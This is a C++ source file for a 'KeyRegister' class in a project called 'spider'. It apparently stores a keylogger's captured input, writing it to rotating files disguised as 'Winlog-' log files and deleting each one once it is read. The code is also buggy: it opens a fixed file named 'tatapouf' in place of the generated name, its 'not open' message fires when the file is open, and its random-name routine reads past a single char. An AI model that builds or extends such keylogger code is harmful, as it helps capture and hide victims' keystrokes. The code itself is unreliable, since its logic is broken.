#include "keyRegister/keyRegister.hpp"
#include <stdlib.h>
#include <time.h>

namespace spider
{
	KeyRegister::KeyRegister(size_t fileMaxSize)
		: _currentFileSize(0), _fileMaxSize(fileMaxSize)
	{
		_writeMode = true;
		srand (time(NULL));
		openWriteableFile();
	}

	void KeyRegister::write(char *msg, int length)
	{
		if (!_currentFile.is_open())
			return ;
		if (_currentFileSize + length >= _fileMaxSize)
		{
			_currentFile.close();
			openWriteableFile();
		}
		_currentFile.write(msg, length);
		_currentFileSize += length;
	}

	char *KeyRegister::read()
	{
		char *messages;
		int size;

		if (!_currentFile.is_open())
			return (NULL);
		_currentFile.seekg (0, _currentFile.end);
		size = _currentFile.tellg();
		_currentFile.seekg (0, _currentFile.beg);
		messages = new char[size];
		_currentFile.read(messages, size);
		if (!_currentFile)
		{
			delete[] messages;
			messages = NULL;
		}
		_currentFile.close();
		std::remove(_file.front().c_str());
		_file.pop_front();
		openReadableFile();
		return (messages);
	}

	void KeyRegister::swapMode()
	{
		if (_writeMode)
		{
			_writeMode = false;
			_currentFile.close();
			openReadableFile();
		}
		else
		{
			_writeMode = true;
			_currentFile.close();
			openWriteableFile();
		}
	}

	void KeyRegister::openReadableFile()
	{
		if (!_file.empty())
		{
			_currentFile.open(_file.front(), std::fstream::in | std::fstream::binary);
		}
	}

	void KeyRegister::openWriteableFile()
	{
		std::string file(std::string("Winlog-") + getRandomAscii());
		std::cout << "openfile : " << file << std::endl;
		_currentFile.open("tatapouf", std::fstream::out | std::ifstream::binary);
		if (_currentFile.is_open())
			std::cout << "pas ouvert" << std::endl;
		_currentFileSize = 0;
		_file.push_back(file);
	}

	std::string KeyRegister::getRandomAscii()
	{
		std::string randomAscii("");
		for (int i = 0; i < 10; ++i)
		{
			char c = rand() %90 + 32;
			randomAscii += std::string(&c);
		}
		return (randomAscii);
	}
}